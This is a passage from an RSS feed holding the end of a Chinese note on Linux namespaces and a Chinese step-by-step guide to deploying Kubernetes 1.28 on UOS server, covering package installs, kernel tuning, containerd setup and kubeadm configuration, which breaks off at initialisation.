<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'user:[4026531837]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> uts</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'uts:[4026532342]'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>namespace都是链接文件，格式为xxx:[inode number]。</p>
<p>Kubernests的Pod 的SideCar机制也是利用了这种特性，有选择的打通pause容器和其他容器之间的名称空间。</p>
<p>在系统层来看的话，就是每个sidecar内的容器使用了同一个net namespace inode的名称空间，这样他们的资源就实现了共享。</p>
<p>既然每个进程都有名称空间，那么pid为1的init进程也拥有自己的名称空间，就是系统开机之后使用的名称空间，所有的物理网卡也在这个名称空间下。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/proc/1/ns/net</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>UOS(1070a)服务器版本部署Kubernetes1.28</title>
      <link>https://www.geekery.cn/note-book/Kubernetes/UOS(1070a)%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%89%88%E6%9C%AC%E9%83%A8%E7%BD%B2Kubernetes1.28.html</link>
      <guid>https://www.geekery.cn/note-book/Kubernetes/UOS(1070a)%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%89%88%E6%9C%AC%E9%83%A8%E7%BD%B2Kubernetes1.28.html</guid>
      <source url="https://www.geekery.cn/rss.xml">UOS(1070a)服务器版本部署Kubernetes1.28</source>
      <description>UOS(1070a)服务器版本部署Kubernetes1.28 UOS 系统基于 CentOS 8 深度定制，虽可沿用 CentOS 8 的软件源，但 CentOS 8 已终止技术支持，可选的安全软件包极为有限，这无疑增加了 Kubernetes 1.28 部署过程的难度。 根据下面的步骤可以成功部署kuberntes集群 组件部署 普通组件 基础组件...</description>
      <pubDate>Thu, 21 Nov 2024 07:57:00 GMT</pubDate>
      <content:encoded><![CDATA[
<p>UOS 系统基于 CentOS 8 深度定制，虽可沿用 CentOS 8 的软件源，但 CentOS 8 已终止技术支持，可选的安全软件包极为有限，这无疑增加了 Kubernetes 1.28 部署过程的难度。</p>
<p>根据下面的步骤可以成功部署kuberntes集群</p>
<h2>组件部署</h2>
<p>普通组件</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> jq</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> psmisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> net-tools</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> telnet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> yum-utils</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device-mapper-persistent-data</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lvm2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> git</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>基础组件</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> conntrack</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> iproute-tc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>ipvs</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ipvsadm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ipset</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sysstat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libseccomp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>基础优化</h2>
<h3>内核限制优化</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">ulimit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -SHn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65535</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt;&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/security/limits.conf</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"># Add custom limits for all users</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">* soft nofile 65536</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">* hard nofile 131072</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">* soft nproc 65535</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">* hard nproc 65535</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">* soft memlock unlimited</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">* hard memlock unlimited</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用如下命令查看生效情况</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">ulimit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>内核模块</h3>
<p>开机自动加载</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt; </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt;&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/modules-load.d/ipvs.conf</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_lc</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_wlc</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_rr</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_wrr</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_lblc</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_lblcr</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_dh</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_sh</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_fo</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_nq</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_sed</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_ftp</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_vs_sh</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">nf_conntrack</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_tables</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ip_set</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">xt_set</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ipt_set</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ipt_rpfilter</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ipt_REJECT</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ipip</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">overlay</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">br_netfilter</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>重新加载模块</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemd-modules-load.service</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>内核参数优化</h3>
<p>cri和网络专项优化</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/sysctl.d/k8s.conf</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.ip_forward = 1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.bridge.bridge-nf-call-iptables = 1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.bridge.bridge-nf-call-ip6tables = 1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">fs.may_detach_mounts = 1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">vm.overcommit_memory=1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">vm.panic_on_oom=0</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">fs.inotify.max_user_watches=89100</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">fs.file-max=52706963</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">fs.nr_open=52706963</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.netfilter.nf_conntrack_max=2310720</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_keepalive_time = 600</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_keepalive_probes = 3</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_keepalive_intvl =15</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_max_tw_buckets = 36000</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_tw_reuse = 1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_max_orphans = 327680</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_orphan_retries = 3</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_syncookies = 1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_max_syn_backlog = 16384</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.ip_conntrack_max = 65536</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_max_syn_backlog = 16384</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.ipv4.tcp_timestamps = 0</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">net.core.somaxconn = 16384</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sysctl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --system</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 如果不生效，需要检查sysctl.conf里面是否有冲突的内核配置</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>安装containerd</h2>
<blockquote>
<p>版本必须大于1.6否则会报错OCI有问题</p>
</blockquote>
<p>因为默认使用了4.19版本内核找不到匹配的包，请使用命令直接安装3.1内核版本，已测试功能兼容，可以正常工作。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/centos/8Server/x86_64/stable/Packages/containerd.io-1.6.9-3.1.el8.x86_64.rpm</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>生成默认配置，并更改参数</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">containerd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/containerd/config.toml</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 修改Cgroup为true</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">SystemdCgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> true</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 修改pause为 registry.aliyuncs.com/google_containers/pause:3.9 ,请使用较新的3.9版本。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sandbox_image</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "registry.aliyuncs.com/google_containers/pause:3.9"</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> containerd</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>配置containerd管理工具（可选）</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/etc/crictl.yaml</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">runtime-endpoint:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> unix:///run/containerd/containerd.sock</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">image-endpoint:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> unix:///run/containerd/containerd.sock</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">timeout:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">debug:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> false</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>安装kubernetes</h2>
<h3>镜像源</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/etc/yum.repos.d/kubernetes.repo</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">[kubernetes]</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">name=Kubernetes</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">enabled=1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">gpgcheck=1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">repo_gpgcheck=1</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>安装组件</h3>
<blockquote>
<p>最新就是1.28 不用锁定版本</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kubeadm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kubelet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kubectl</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kubelet</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>安装主要组件</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kubeadm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> print</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> init-defaults</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/root/kubeadm.yml</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>修改关键参数</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">...</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">镜像源：</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> registry.aliyuncs.com/google_containers/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">api地址：</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aa.bb.cc.dd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">node名字：</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master?</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>拉取默认镜像减少出错概率</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kubeadm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --config</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /root/kubeadm.yml</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>初始化</p>
